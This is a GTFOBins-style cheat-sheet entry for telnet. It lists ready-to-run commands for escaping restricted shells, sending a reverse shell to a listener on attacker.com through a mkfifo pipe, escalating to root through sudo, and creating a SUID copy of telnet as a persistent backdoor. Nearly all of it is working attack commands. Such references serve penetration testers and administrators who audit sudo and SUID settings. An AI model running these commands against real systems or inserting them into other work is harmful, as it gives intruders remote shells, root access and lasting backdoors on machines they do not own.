# GTFOBin: telnet

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

BSD version only. Needs to be connected first.

```
RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

BSD version only. Needs to be connected first.

```
RHOST=attacker.com
RPORT=12345
sudo telnet $RHOST $RPORT
^]
!/bin/sh
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

BSD version only. Needs to be connected first.

```
sudo install -m =xs $(which telnet) .

RHOST=attacker.com
RPORT=12345
./telnet $RHOST $RPORT
^]
!/bin/sh
```